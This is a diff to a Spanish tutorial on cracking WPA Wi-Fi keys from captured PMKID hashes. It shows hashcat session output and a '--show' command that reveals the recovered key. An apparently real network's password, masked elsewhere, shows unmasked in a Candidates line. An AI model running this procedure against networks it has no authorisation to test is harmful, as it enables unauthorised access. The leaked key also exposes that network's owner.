@@ -3745,6 +3745,9 @@ best PMKIDs......................: 2
 2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
 ```
 
+**ANOTACIÓN**: Para saber a qué redes pertenecen estos Hashes, tan sólo tenemos que visualizar el valor
+comprendido entre el primer y segundo asterisco. Corresponden a las BSSID's de los AP's.
+
 Y estos, ya pueden ser pasados por **hashcat** para someterlos a la fase de Cracking:
 
 ```bash
@@ -3827,6 +3830,64 @@ En mi caso, tiro de **GPU** y os puedo decir que el tiempo total para cracker es
 Se podría decir que es una gozada, porque nos estamos olvidando tanto de **aircrack** como de **aireplay**, de
 **airodump**, **pyrit**, **airolib**, **cowpatty**, **genpmk**, etc.
 
+Una vez crackeada la contraseña, esta es mostrada:
+
+```bash
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Type........: WPA-PMKID-PBKDF2
+Hash.Target......: myHashes
+Time.Started.....: Mon Aug 12 22:48:04 2019 (1 min, 51 secs)
+Time.Estimated...: Mon Aug 12 22:52:25 2019 (2 mins, 30 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    89458 H/s (57.26ms) @ Accel:512 Loops:128 Thr:64 Vec:1
+Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
+Progress.........: 15218868/28688774 (53.05%)
+Rejected.........: 5388468/15218868 (35.41%)
+Restore.Point....: 7545850/14344387 (52.60%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2944
+Candidates.#1....: horneybabe1987 -> groovejet
+Hardware.Mon.#1..: Temp: 86c Util: 99% Core:1632MHz Mem:3504MHz Bus:8
+
+Approaching final keyspace - workload adjusted.  
+
+2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXX
+                                                 
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: WPA-PMKID-PBKDF2
+Hash.Target......: myHashes
+Time.Started.....: Mon Aug 12 22:48:04 2019 (3 mins, 36 secs)
+Time.Estimated...: Mon Aug 12 22:51:40 2019 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    88906 H/s (47.34ms) @ Accel:512 Loops:128 Thr:64 Vec:1
+Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
+Progress.........: 28688774/28688774 (100.00%)
+Rejected.........: 9469826/28688774 (33.01%)
+Restore.Point....: 14344387/14344387 (100.00%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 0133112024erdalk -> KqpsEFunpo7w29nrbx4H
+Hardware.Mon.#1..: Temp: 88c Util: 99% Core:1632MHz Mem:3504MHz Bus:8
+
+Started: Mon Aug 12 22:48:02 2019
+Stopped: Mon Aug 12 22:51:42 2019
+```
+
+O también:
+
+```bash
+┌─[root@parrot]─[/usr/share/wordlists]
+└──╼ #cat myHashes 
+0d4191730a005481706436bdbc50919c*fcb4e699a909*b0febdab6d9d*4d4f5649535441525f41393038
+2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737
+┌─[root@parrot]─[/usr/share/wordlists]
+└──╼ #hashcat -m 16800 --show myHashes 
+2fb026310184f6efcb0fd0d69b198b3a*1cb044d41678*b0febdab6d9d*4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXXXXXX
+```
 
 
 
